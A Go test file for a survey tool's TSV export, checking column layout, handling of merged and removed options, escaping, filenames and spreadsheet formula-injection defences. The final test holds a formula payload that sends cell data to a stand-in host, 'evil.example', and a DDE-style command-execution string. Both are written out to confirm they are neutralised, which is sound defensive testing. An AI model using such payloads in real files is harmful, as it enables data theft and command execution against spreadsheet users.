package export

import (
	"io"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/woodysmith1912/quicksurvey/internal/store"
)

func fixture(t *testing.T) (*store.Store, *store.Survey) {
	t.Helper()
	s, err := store.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	sv, err := s.CreateSurvey("Team offsite", "", []string{"Rock climbing", "Escape room", "Bowling"})
	if err != nil {
		t.Fatal(err)
	}
	sv, err = s.UpdateSurvey(sv.ID, func(d *store.Survey) error { d.State = store.StateOpen; return nil })
	if err != nil {
		t.Fatal(err)
	}
	return s, sv
}

// grid splits a TSV into rows of fields, which is how the assertions read.
func grid(s string) [][]string {
	var out [][]string
	for _, line := range strings.Split(strings.TrimRight(s, "\n"), "\n") {
		out = append(out, strings.Split(line, "\t"))
	}
	return out
}

func TestResponsesTSVShape(t *testing.T) {
	s, sv := fixture(t)
	climb, escape, bowl := sv.Options[0].ID, sv.Options[1].ID, sv.Options[2].ID
	if _, err := s.SaveResponse(sv.ID, "v1", []string{climb, bowl}, "no heights please"); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SaveResponse(sv.ID, "v2", []string{escape}, ""); err != nil {
		t.Fatal(err)
	}

	var b strings.Builder
	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
		t.Fatal(err)
	}
	rows := grid(b.String())
	if len(rows) != 3 {
		t.Fatalf("got %d rows, want a header plus 2 responses:\n%s", len(rows), b.String())
	}
	head := rows[0]
	want := []string{"response_id", "submitted", "updated", "Rock climbing", "Escape room", "Bowling", "selections", "comment"}
	if len(head) != len(want) {
		t.Fatalf("header = %v, want %v", head, want)
	}
	for i := range want {
		if head[i] != want[i] {
			t.Errorf("header[%d] = %q, want %q", i, head[i], want[i])
		}
	}
	// Rows are in submission order, so row 1 is v1.
	if got := rows[1][3:6]; got[0] != "1" || got[1] != "0" || got[2] != "1" {
		t.Errorf("v1 selections = %v, want [1 0 1]", got)
	}
	if rows[1][6] != "2" {
		t.Errorf("v1 selection count = %q, want 2", rows[1][6])
	}
	if rows[1][7] != "no heights please" {
		t.Errorf("v1 comment = %q", rows[1][7])
	}
	if rows[2][7] != "" {
		t.Errorf("v2 comment = %q, want empty", rows[2][7])
	}
	// Every row must have the same number of fields, or Sheets misaligns.
	for i, r := range rows {
		if len(r) != len(head) {
			t.Errorf("row %d has %d fields, want %d", i, len(r), len(head))
		}
	}
}

func TestTabsAndNewlinesInFreeTextCannotShiftColumns(t *testing.T) {
	s, sv := fixture(t)
	if _, err := s.UpdateSurvey(sv.ID, func(d *store.Survey) error {
		return store.SetOptionText(d, sv.Options[0].ID, "Climbing\tindoors")
	}); err != nil {
		t.Fatal(err)
	}
	sv, _ = s.Survey(sv.ID)
	if _, err := s.SaveResponse(sv.ID, "v1", nil, "line one\nline two\tand a tab"); err != nil {
		t.Fatal(err)
	}

	var b strings.Builder
	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
		t.Fatal(err)
	}
	rows := grid(b.String())
	if len(rows) != 2 {
		t.Fatalf("a newline in a comment broke the row structure:\n%q", b.String())
	}
	if len(rows[1]) != len(rows[0]) {
		t.Errorf("a tab in a comment shifted columns: %d fields vs %d", len(rows[1]), len(rows[0]))
	}
	if got := rows[1][len(rows[1])-1]; got != "line one line two and a tab" {
		t.Errorf("comment = %q, want tabs and newlines replaced by spaces", got)
	}
}

func TestRemovedOptionsStayInTheExportAndMergedOnesDoNot(t *testing.T) {
	s, sv := fixture(t)
	if _, err := s.SaveResponse(sv.ID, "v1", []string{sv.Options[0].ID}, ""); err != nil {
		t.Fatal(err)
	}
	sv, err := s.UpdateSurvey(sv.ID, func(d *store.Survey) error {
		if err := store.SetOptionStatus(d, sv.Options[1].ID, store.OptRemoved, ""); err != nil {
			return err
		}
		return store.SetOptionStatus(d, sv.Options[2].ID, store.OptMerged, sv.Options[0].ID)
	})
	if err != nil {
		t.Fatal(err)
	}

	var b strings.Builder
	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
		t.Fatal(err)
	}
	head := grid(b.String())[0]
	joined := strings.Join(head, "|")
	if !strings.Contains(joined, "Escape room [removed]") {
		t.Errorf("a removed option should stay in the export, marked: %v", head)
	}
	if strings.Contains(joined, "Bowling") {
		t.Errorf("a merged option should not get its own column; its votes are under the target: %v", head)
	}
}

// A respondent whose only pick was later merged into another option must show
// up under the target column, matching what Summary counts as a vote for it —
// the two files describe the same person and must agree.
func TestAPickOfAMergedDuplicateCountsForTheTargetInBothFiles(t *testing.T) {
	s, sv := fixture(t)
	climb := sv.Options[0].ID
	dup, err := s.AddWriteIn(sv.ID, "v1", "Rock climbing (dup)")
	if err != nil {
		t.Fatal(err)
	}
	sv, err = s.UpdateSurvey(sv.ID, func(d *store.Survey) error {
		return store.SetOptionStatus(d, dup, store.OptMerged, climb)
	})
	if err != nil {
		t.Fatal(err)
	}

	var b strings.Builder
	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
		t.Fatal(err)
	}
	rows := grid(b.String())
	head, row1 := rows[0], rows[1]
	if strings.Contains(strings.Join(head, "|"), "dup") {
		t.Errorf("the merged duplicate should not have its own column: %v", head)
	}
	col := -1
	for i, h := range head {
		if h == "Rock climbing" {
			col = i
		}
	}
	if col < 0 {
		t.Fatalf("Rock climbing column missing from %v", head)
	}
	if row1[col] != "1" {
		t.Errorf("Rock climbing column = %q, want 1 (the vote for the merged duplicate resolves here)", row1[col])
	}

	results, voters := s.Tally(sv.ID)
	if err := Summary(io.Discard, sv, results, voters); err != nil {
		t.Fatal(err)
	}
	var climbVotes int
	for _, res := range results {
		if res.Option.ID == climb {
			climbVotes = res.Votes
		}
	}
	if climbVotes != 1 {
		t.Errorf("Summary counts %d votes for Rock climbing, want 1 — the wide file and the summary disagree", climbVotes)
	}
}

// Two duplicates merged into the same target must not double-count one
// respondent, in either file.
func TestTwoDuplicatesMergedIntoTheSameTargetCountOneSelection(t *testing.T) {
	s, sv := fixture(t)
	climb := sv.Options[0].ID
	dup1, err := s.AddWriteIn(sv.ID, "v1", "Rock climbing (dup 1)")
	if err != nil {
		t.Fatal(err)
	}
	dup2, err := s.AddWriteIn(sv.ID, "v1", "Rock climbing (dup 2)")
	if err != nil {
		t.Fatal(err)
	}
	sv, err = s.UpdateSurvey(sv.ID, func(d *store.Survey) error {
		if err := store.SetOptionStatus(d, dup1, store.OptMerged, climb); err != nil {
			return err
		}
		return store.SetOptionStatus(d, dup2, store.OptMerged, climb)
	})
	if err != nil {
		t.Fatal(err)
	}

	var b strings.Builder
	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
		t.Fatal(err)
	}
	rows := grid(b.String())
	head, row1 := rows[0], rows[1]
	col := -1
	for i, h := range head {
		if h == "Rock climbing" {
			col = i
		}
	}
	if col < 0 {
		t.Fatalf("Rock climbing column missing from %v", head)
	}
	if row1[col] != "1" {
		t.Errorf("Rock climbing column = %q, want 1", row1[col])
	}
	selCol := len(head) - 2 // selections is second-to-last
	if row1[selCol] != "1" {
		t.Errorf("selections = %q, want 1 — two duplicates of the same target are one selection", row1[selCol])
	}
}

// A removed option's column keeps reporting a respondent's historical pick
// rather than going blank; only merged options lose their column.
func TestARemovedOptionKeepsItsHistoricalOnesInTheExport(t *testing.T) {
	s, sv := fixture(t)
	escape := sv.Options[1].ID
	if _, err := s.SaveResponse(sv.ID, "v1", []string{escape}, ""); err != nil {
		t.Fatal(err)
	}
	sv, err := s.UpdateSurvey(sv.ID, func(d *store.Survey) error {
		return store.SetOptionStatus(d, escape, store.OptRemoved, "")
	})
	if err != nil {
		t.Fatal(err)
	}

	var b strings.Builder
	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
		t.Fatal(err)
	}
	rows := grid(b.String())
	head, row1 := rows[0], rows[1]
	col := -1
	for i, h := range head {
		if h == "Escape room [removed]" {
			col = i
		}
	}
	if col < 0 {
		t.Fatalf("removed option column missing from %v", head)
	}
	if row1[col] != "1" {
		t.Errorf("removed option column = %q, want 1 — a withdrawn option keeps its historical votes", row1[col])
	}
}

func TestSummaryTSV(t *testing.T) {
	s, sv := fixture(t)
	climb := sv.Options[0].ID
	for _, v := range []string{"v1", "v2", "v3"} {
		if _, err := s.SaveResponse(sv.ID, v, []string{climb}, ""); err != nil {
			t.Fatal(err)
		}
	}
	if _, err := s.SaveResponse(sv.ID, "v4", []string{sv.Options[1].ID}, ""); err != nil {
		t.Fatal(err)
	}

	results, voters := s.Tally(sv.ID)
	var b strings.Builder
	if err := Summary(&b, sv, results, voters); err != nil {
		t.Fatal(err)
	}
	rows := grid(b.String())
	if rows[0][0] != "option" || rows[0][3] != "percent_of_respondents" ||
		rows[0][4] != "shown_to" || rows[0][5] != "percent_of_shown" {
		t.Errorf("header = %v", rows[0])
	}
	if rows[1][0] != "Rock climbing" || rows[1][1] != "3" || rows[1][2] != "4" || rows[1][3] != "75.0" ||
		rows[1][4] != "4" || rows[1][5] != "75.0" {
		t.Errorf("top row = %v, want [Rock climbing 3 4 75.0 4 75.0]", rows[1])
	}
}

// An option someone never had on their ballot is blank, not 0. In Sheets,
// AVERAGE over the column then gives the share of those shown it, and COUNT
// gives how many were.
func TestAnOptionNeverShownToARespondentIsBlankNotZero(t *testing.T) {
	s, sv := fixture(t)
	if _, err := s.SaveResponse(sv.ID, "v1", []string{sv.Options[0].ID}, ""); err != nil {
		t.Fatal(err)
	}
	late, err := s.AddWriteIn(sv.ID, "v2", "Karaoke")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := s.UpdateSurvey(sv.ID, func(d *store.Survey) error {
		return store.SetOptionStatus(d, late, store.OptApproved, "")
	}); err != nil {
		t.Fatal(err)
	}
	if _, err := s.SaveResponse(sv.ID, "v3", nil, ""); err != nil {
		t.Fatal(err)
	}
	sv, _ = s.Survey(sv.ID)

	var b strings.Builder
	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
		t.Fatal(err)
	}
	rows := grid(b.String())
	col := -1
	for i, h := range rows[0] {
		if h == "Karaoke" {
			col = i
		}
	}
	if col < 0 {
		t.Fatalf("Karaoke column missing from %v", rows[0])
	}
	// v1 answered before it existed; v2 proposed it; v3 saw it and passed.
	if got := []string{rows[1][col], rows[2][col], rows[3][col]}; got[0] != "" || got[1] != "1" || got[2] != "0" {
		t.Errorf("Karaoke column = %q, want [\"\" \"1\" \"0\"]", got)
	}
	for i, r := range rows {
		if len(r) != len(rows[0]) {
			t.Errorf("row %d has %d fields, want %d", i, len(r), len(rows[0]))
		}
	}
}

func TestFilename(t *testing.T) {
	now := time.Date(2026, 9, 8, 12, 0, 0, 0, time.UTC)
	cases := []struct{ title, want string }{
		{"Team offsite 2026!", "team-offsite-2026-responses-20260908.tsv"},
		{"  ***  ", "-responses-20260908.tsv"}, // falls back to the survey ID
		{"A/B — test", "ab-test-responses-20260908.tsv"},
	}
	for _, c := range cases {
		sv := &store.Survey{ID: "surveyid", Title: c.title}
		want := c.want
		if strings.HasPrefix(want, "-") {
			want = "surveyid" + want
		}
		if got := Filename(sv, "responses", now); got != want {
			t.Errorf("Filename(%q) = %q, want %q", c.title, got, want)
		}
	}
}

// A spreadsheet runs a cell that starts with =, +, - or @. The whole point of
// this file is that it goes straight into Google Sheets, so respondent text
// must not be able to execute there.
func TestFormulaInjectionIsNeutralised(t *testing.T) {
	s, sv := fixture(t)
	const attack = `=HYPERLINK("http://evil.example/?"&A1,"click")`
	if _, err := s.SaveResponse(sv.ID, "v1", []string{sv.Options[0].ID}, attack); err != nil {
		t.Fatal(err)
	}
	// A write-in reaches the export as a column header before any moderator
	// has looked at it.
	if _, err := s.AddWriteIn(sv.ID, "v2", "@SUM(1+1)*cmd|' /C calc'!A0"); err != nil {
		t.Fatal(err)
	}
	sv, _ = s.Survey(sv.ID)

	var b strings.Builder
	if err := Responses(&b, sv, s.Responses(sv.ID), time.UTC); err != nil {
		t.Fatal(err)
	}
	for _, line := range strings.Split(b.String(), "\n") {
		for _, field := range strings.Split(line, "\t") {
			if field == "" {
				continue
			}
			switch field[0] {
			case '=', '+', '@':
				t.Errorf("cell would be evaluated as a formula: %q", field)
			case '-':
				// A negative number is fine; text is not.
				if _, err := strconv.ParseFloat(field, 64); err != nil {
					t.Errorf("cell would be evaluated as a formula: %q", field)
				}
			}
		}
	}
	// The text is still readable, just inert.
	if !strings.Contains(b.String(), "'"+attack) {
		t.Error("the comment should be preserved, prefixed with an apostrophe")
	}
}
